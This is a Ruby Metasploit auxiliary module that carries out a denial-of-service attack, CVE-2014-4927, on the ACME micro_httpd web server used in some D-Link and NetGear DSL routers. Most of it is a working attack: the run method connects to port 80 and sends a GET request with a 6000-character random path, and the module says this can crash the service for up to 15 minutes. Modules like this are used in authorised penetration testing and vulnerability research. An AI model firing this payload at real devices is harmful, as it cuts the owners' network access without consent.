##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ACME micro_httpd HTTP GET Request Denial of Service',
      'Description'    => %q{
        This module triggers a Denial of Service condition in the ACME micro_httpd
        HTTP service used in D-Link's DSL2750U, DSL2740U and NetGear's WGR614, 
        MR-ADSL-DG834 models. Denial of service condition may last up to 15 minutes
        in some cases
      },
      'Author' 		=> [ 'Yuval tisf Nativ <yuval[at]morirt.com>' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'BID', '68746'],
          [ 'CVE', '2014-4927'],
          [ 'URL', 'http://www.cvedetails.com/cve/CVE-2014-4927/'],
          [ 'OSVDB', '109356' ],
        ],
      'DisclosureDate' => 'Jul 24 2014'))

    register_options(
      [
        Opt::RPORT(80),
      ], self.class)

  end

  def run
    connect

    print_status("Sending HTTP DoS Packet")

    biggot = "GET " +  Rex::Text.rand_text_alphanumeric(6000) + " HTTP/1.1"
    sock.put(biggot + "\r\n\r\n")

    disconnect
  end

end


